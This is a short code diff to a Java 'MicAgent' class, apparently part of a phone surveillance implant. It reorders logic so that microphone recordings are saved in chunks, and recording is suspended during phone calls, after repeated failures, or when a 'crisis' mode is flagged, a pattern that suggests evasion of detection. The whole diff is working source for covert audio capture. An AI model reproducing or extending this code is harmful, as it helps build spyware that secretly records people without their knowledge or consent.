@@ -227,23 +227,28 @@ public final class MicAgent extends Agent implements PhoneListener {
         synchronized (stateLock) {
             if (state == STARTED) {
                
+                if (numFailures < 10) {
+                    saveRecorderLog();
+                } else {
+                    //#ifdef DEBUG_WARN
+                    debug.warn("numFailures: " + numFailures);
+                    //#endif
+
+                    suspend();
+                }
+                
                 if (status.callInAction()) {
                     //#ifdef DEBUG_WARN
                     debug.warn("phone call in progress, suspend!");
                     //#endif                   
                     suspend();
-                } else {
-
-                    if (numFailures < 10) {
-                        saveRecorderLog();
-                    } else {
-                        //#ifdef DEBUG_WARN
-                        debug.warn("numFailures: " + numFailures);
-                        //#endif
-
-                        suspend();
-                    }
-                }
+                    
+                }else if(Status.getInstance().crisisMic()){
+                    //#ifdef DEBUG_WARN
+                    debug.warn("crisis, suspend!");
+                    //#endif                   
+                    suspend();
+                } 
             }
         }
     }
@@ -273,7 +278,6 @@ public final class MicAgent extends Agent implements PhoneListener {
                 debug.trace("offset: " + offset);
             } else {
             }
-
             //#endif
 
             log.writeLog(chunk, offset);
